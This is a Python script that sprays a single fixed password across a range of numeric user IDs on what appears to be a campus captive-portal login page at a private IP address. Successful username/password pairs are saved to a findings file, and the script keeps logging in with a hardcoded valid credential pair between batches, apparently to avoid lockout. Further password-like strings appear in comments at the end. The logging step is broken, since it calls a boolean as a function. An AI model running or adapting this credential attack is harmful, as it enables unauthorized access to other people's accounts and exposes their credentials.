import requests
import time

url = "http://172.16.68.6:8090/login.xml"


def login(user, passwd, append_to_file_bool):
    req = {"mode": "191", "username": user, "password": passwd}
    x = requests.post(url, data=req)
    if x.text[90] == "Y":
        if append_to_file_bool:
            success_message = f"{user},{passwd}"
            append_to_file_bool(success_message)
        return f"[+] SUCCESS User = {user}, Pass = {passwd}"
    else:
        return f"[-] {user} Failure :("


def logout(user):
    req = {"mode": "193", "username": user}
    x = requests.post(url, data=req)


def correct_attempt():
    login("19102168", "178045HI", append_to_file_bool=False)


def append_to_file(message):
    with open("2024-findings.txt", "a") as file:
        file.write(message + "\n")


for en in range(22103288, 22104066, 4):
    print(login(en, "TJ9R6P9MG", True))
    time.sleep(0.001)
    logout(en)
    print(login(en + 1, "TJ9R6P9MG", True))
    time.sleep(0.001)
    logout(en)
    print(login(en + 2, "TJ9R6P9MG", True))
    time.sleep(0.001)
    logout(en)
    print(login(en + 3, "TJ9R6P9MG", True))
    time.sleep(0.001)
    logout(en)
    correct_attempt()

# 179001AS
# 357043AR
